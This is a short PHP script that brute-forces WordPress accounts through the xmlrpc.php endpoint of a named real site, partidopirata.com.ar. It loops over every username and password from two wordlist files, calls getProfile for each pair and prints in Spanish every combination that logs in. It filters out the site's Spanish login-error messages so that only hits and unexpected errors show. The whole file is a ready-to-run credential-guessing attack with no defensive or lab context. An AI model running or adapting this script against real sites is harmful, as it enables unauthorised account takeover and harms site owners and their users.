<?php

require 'vendor/autoload.php';

$domain = 'http://partidopirata.com.ar';
$endpoint = $domain . "/xmlrpc.php";

$users_file = 'users.txt';
$passwords_file = 'passwords.txt';


$users = file($users_file);
$passwords = file($passwords_file);

echo "Users file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";

function is_not_login_error($e) {
  return strpos($e->getMessage(), 'Usuario') === false && strpos($e->getMessage(), 'incorrecta') === false;
}

foreach ( $users as $user ) {
  foreach ( $passwords as $pass ) {
    $pass = trim($pass);
    $user = trim($user);

    # Create client instance
    $wpClient = new \HieuLe\WordpressXmlrpcClient\WordpressClient($endpoint, $user, $pass);

    try {
      $a = $wpClient->getProfile();

      echo "El password de '$user' es '$pass'\n";

    } catch ( Exception $e ) {
      if ( is_not_login_error($e) ) {
        var_dump($e);
      }
    }
  }
}
